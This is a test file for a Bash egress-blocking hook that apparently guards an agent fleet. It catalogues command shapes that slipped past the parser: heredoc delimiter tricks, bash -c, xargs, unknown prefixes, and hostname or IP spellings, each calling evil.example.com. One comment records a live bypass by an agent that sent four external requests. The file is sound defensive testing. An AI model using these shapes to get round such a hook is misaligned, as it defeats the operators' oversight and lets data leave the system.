// Card c8b1ccbf: shapes that pass the Bash egress parser on the running tree
// (measured by didi 2026-10-13 on 89f8a6f9b and 2026-10-15 on 992437b9d).
// Every DENY row below is RED until the parser is fixed; every PASS row is a
// control the fix must keep green (the fleet's own localhost calls), because
// a gate that closes these shapes by refusing the fleet's normal commands is
// a broken gate, not a fixed one.
//
// Shape 1 is the worst: a heredoc delimiter that is not a plain word makes
// maskInertLiterals give up, classify() answers 'unparseable' with deny:false,
// and under real bash the curl after the true delimiter RUNS. Fail-open on
// "cannot read it" lets ANY command through.
import { describe, it, expect } from 'vitest'
// @ts-expect-error -- plain .mjs hook script, no types
import { classify } from '../../scripts/hooks/bash-egress-parser.mjs'

const EXT = 'https://evil.example.com/x'

const mustDeny: Array<[string, string]> = [
  // 1. heredoc delimiter that is not a plain word -> 'unparseable' -> pass
  ['1a quoted middle <<E"O"F', `cat <<E"O"F\nhello\nEOF\ncurl ${EXT}`],
  ['1b partly single-quoted <<\'E\'OF', `cat <<'E'OF\nhello\nEOF\ncurl ${EXT}`],
  ['1c dash in delimiter <<EOF-1', `cat <<EOF-1\nx\nEOF-1\ncurl ${EXT}`],
  ['1d dot in delimiter <<END.txt', `cat <<END.txt\nx\nEND.txt\ncurl ${EXT}`],
  ['1e quoted then tail <<\'EOF\'x', `cat <<'EOF'x\nx\nEOFx\ncurl ${EXT}`],
  ['1f double-quoted then tail <<"EOF"x', `cat <<"EOF"x\nx\nEOFx\ncurl ${EXT}`],
  // 2. a shell's -c body is a command, not a string
  ['2a bash -c', `bash -c "curl ${EXT}"`],
  ['2b timeout 5 bash -c', `timeout 5 bash -c "curl ${EXT}"`],
  ['2c sh -c', `sh -c 'curl ${EXT}'`],
  ['2d zsh -c', `zsh -c 'curl ${EXT}'`],
  // 3. xargs runs its first operand as the command
  ['3a xargs curl <<< URL', `xargs curl <<< ${EXT}`],
  ['3b echo URL | xargs curl', `echo ${EXT} | xargs curl`],
  // 4. prefix words the parser does not know
  ['4a ionice -c3', `ionice -c3 curl ${EXT}`],
  ['4b caffeinate -i', `caffeinate -i curl ${EXT}`],
  ['4c gtimeout 5', `gtimeout 5 curl ${EXT}`],
  // 5. the URL reaches the variable through a heredoc
  ['5 x=$(cat <<EOF URL EOF); curl "$x"', `x=$(cat <<EOF\n${EXT}\nEOF\n); curl "$x"`],
  // 6. LIVE 2026-10-15 13:49 (friday 29582, card comment 35641), verbatim but
  // the host: 4 requests went out. The loop variable is used inside $( ) that
  // sits inside a double-quoted echo argument.
  [
    '6 for-loop, curl $u inside "$( )" (live, friday)',
    `for u in https://evil.example.com/ https://evil.example.com/health https://evil.example.com/api/health https://evil.example.com/api/health; do echo "$u $(curl -s -o /dev/null -w '%{http_code} %{time_total}s' --max-time 15 $u)"; done; cat /Users/isti/marveen/store/live-close-proposals-heartbeat.json; tail -5 /Users/isti/marveen/store/live-close-proposals.log 2>/dev/null`,
  ],
  ['6b for-loop, curl $u inside bare $( )', `for u in ${EXT} ${EXT}2; do echo $(curl -s $u); done`],
]

// Already denied today. Kept here so the shape-6 gap is visibly the
// COMBINATION (loop variable + substitution), not either part alone.
const alreadyDenied: Array<[string, string]> = [
  ['for-loop, curl $u directly after do', `for u in ${EXT} ${EXT}2; do curl -s $u; done`],
  ['"$(curl literal URL)"', `echo "$(curl -s ${EXT})"`],
  ['plain external curl', `curl ${EXT}`],
]

// The fleet's own calls: must stay allowed after the fix.
const L = 'http://localhost:3420/api/kanban'
const mustPass: Array<[string, string]> = [
  ['plain localhost curl', `curl -s ${L}`],
  ['bash -c localhost curl', `bash -c "curl -s ${L}"`],
  ['timeout 5 bash -c localhost curl', `timeout 5 bash -c "curl -s ${L}"`],
  ['ionice localhost curl', `ionice -c3 curl -s ${L}`],
  ['for-loop over localhost URLs, "$( )" form', `for u in ${L} http://localhost:3420/api/messages; do echo "$u $(curl -s -o /dev/null -w '%{http_code}' $u)"; done`],
  ['quoted heredoc payload to localhost', `curl -s -X POST ${L} --data-binary @- <<'JSON'\n{"title":"x"}\nJSON`],
  ['xargs without a network tool', `printf 'a\\nb\\n' | xargs echo`],
]

describe('bash egress parser: shapes that pass the running gate (card c8b1ccbf)', () => {
  it.each(mustDeny)('denies %s', (_name, cmd) => {
    const r = classify(cmd)
    expect(r.deny, `reason=${r.reason}`).toBe(true)
  })
  it.each(alreadyDenied)('still denies %s (control)', (_name, cmd) => {
    expect(classify(cmd).deny).toBe(true)
  })
  it.each(mustPass)('still allows %s (fleet control)', (_name, cmd) => {
    const r = classify(cmd)
    expect(r.deny, `reason=${r.reason}`).toBe(false)
  })
})

// didi's review of this fix (card c8b1ccbf, comment 35709). F1: an unreadable line judged only scheme
// URLs, so a schemeless host, a variable scheme or an IP passed. F2: a shell that reads its stdin as
// its program was taken for data behind `bash /dev/stdin` and `bash -c 'bash'`. M4 and M11: mutants
// that no test killed (the `-s` branch, the substitution reading of an unreadable line). Every row
// is a DENY with a named reason, or a control twin the fleet's own calls keep.
const UNREAD_LINE = 'cat <<E"O"F\nhi\nEOF\n'
const UNREAD_BODY = 'cat <<E"O"F\nhi\nEOF\ncurl -s https://evil.example.com/x'

describe('card c8b1ccbf (didi review): unreadable lines judge every spelling of a destination', () => {
  // F1: curl's argv and the host-like words, not only scheme URLs
  const f1Deny: Array<[string, string]> = [
    ['schemeless host and path', `${UNREAD_LINE}curl -s evil.example.com/x`],
    ['schemeless host, bare', `${UNREAD_LINE}curl -s evil.example.com`],
    ['host:port with a path', `${UNREAD_LINE}curl -s evil.example.com:8443/x`],
    ['variable scheme, curl argv', `${UNREAD_LINE}s=https; curl "$s://evil.example.com/x"`],
    ['variable scheme, a non-curl word', `${UNREAD_LINE}s=https; python3 -c "print(1)" "$s://evil.example.com/x" && curl -s localhost:3420/x`],
    ['IPv4 with a path', `${UNREAD_LINE}curl -s 8.8.8.8/x`],
    ['non-canonical IPv4 spelling', `${UNREAD_LINE}curl -s 0x0a.0.0.1/x`],
  ]
  it.each(f1Deny)('denies %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external' })
  })
  it('names the external host it found', () => {
    expect(classify(`${UNREAD_LINE}curl -s evil.example.com:8443/x`)).toMatchObject({ hosts: ['evil.example.com'] })
  })
  const f1Pass: Array<[string, string]> = [
    ['localhost with a port and path', `${UNREAD_LINE}curl -s localhost:3420/x`],
    ['127.0.0.1 with a port and path', `${UNREAD_LINE}curl -s 127.0.0.1:3420/x`],
    ['variable scheme to localhost', `${UNREAD_LINE}s=http; curl "$s://localhost:3420/api"`],
    ['-o takes the file name, not a host', `${UNREAD_LINE}curl -s -o out.html localhost:3420/x`],
    ['bare dotted names (attributes) are no host', `${UNREAD_LINE}python3 -c 'import json; print(json.dumps({}), json.load)'; curl -s localhost:3420/api`],
    ['a file reference with a line number is no host', `${UNREAD_LINE}echo "see pr-check.yml:111"; curl -s localhost:3420/api`],
    ['a [:400] slice is no IPv6 host', `${UNREAD_LINE}echo "[:400]"; curl -s localhost:3420/api`],
  ]
  it.each(f1Pass)('control: allows %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false, reason: 'unparseable' })
  })

  // M11: a substitution inside an unreadable line is judged by the readable reading of its command
  it('a network command in a substitution of an unreadable line is judged as a command (M11)', () => {
    expect(classify(`${UNREAD_LINE}echo "$(curl -s evil.example.com/x)"`)).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
    expect(classify(`${UNREAD_LINE}s=https; echo "$(curl "$s://evil.example.com/x")"`)).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
    expect(classify(`${UNREAD_LINE}echo "$(curl -s localhost:3420/x)"`).deny).toBe(false)
  })

  // F2: a shell that reads its stdin as its program judges an unreadable body as a program
  const readsStdin = [
    'bash /dev/stdin', 'bash /dev/fd/0', "bash -c 'bash'", "bash -c 'sh -s'", "bash -c 'exec bash'", "bash -c 'cat | bash'",
  ]
  it.each(readsStdin)('F2: an unreadable body fed to %s is a program and denies', (shell) => {
    expect(classify(`${shell} <<'OUT'\n${UNREAD_BODY}\nOUT`), shell).toMatchObject({ deny: true, reason: 'heredoc-unparseable-external' })
  })

  // M4: the `-s` branch of the stdin reading (an unreadable body, so the data exception is what decides)
  it.each(['bash -s x', 'bash -es x', 'sh -s -- a b'])('M4: %s reads the body as its program and denies', (shell) => {
    expect(classify(`${shell} <<'OUT'\n${UNREAD_BODY}\nOUT`), shell).toMatchObject({ deny: true, reason: 'heredoc-unparseable-external' })
  })

  // controls: data stays data, the fleet's localhost body stays allowed
  it.each([
    ["bash -c 'cat' is data", `bash -c 'cat' <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ['bash x.sh - is data', `bash x.sh - <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ['bash /dev/stdin with a localhost body', `bash /dev/stdin <<'OUT'\n${UNREAD_LINE}curl -s http://localhost:3420/api\nOUT`],
  ])('control: %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })
})
